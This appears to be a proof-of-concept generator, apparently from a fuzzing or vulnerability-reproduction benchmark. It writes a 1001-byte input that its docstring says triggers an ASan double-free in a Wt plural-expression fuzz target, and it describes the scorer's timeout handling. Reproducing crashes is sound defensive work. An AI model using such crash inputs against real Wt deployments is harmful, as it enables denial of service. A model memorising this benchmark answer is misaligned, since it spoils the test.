#!/usr/bin/env python3
"""Input for Wt fuzz-eval.

eval() catches a plural-expression error and then falls off the end of a
non-void function. On this build that is an ASan double-free in
LLVMFuzzerTestOneInput when the throw happens before the spirit parser.
evalPluralCase throws "too long" once the expression is longer than 1000
bytes, and the fuzzer accepts up to 5120. The patched fuzz target returns
0 after the catch.

Shorter strings (including the 10-byte ClusterFuzz unit) can spin until
the scorer's 10s SIGKILL. That exit is stored as 300 and is not a crash.
"""
import argparse
import pathlib

# Longer than evalPluralCase's 1000-byte guard, under the fuzzer's 5120 cap.
CRASH = b"a" * 1001


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="poc.bin")
    args = ap.parse_args()
    out = pathlib.Path(args.out)
    out.write_bytes(CRASH)
    print(f"wrote {out} ({len(CRASH)} bytes)")


if __name__ == "__main__":
    main()
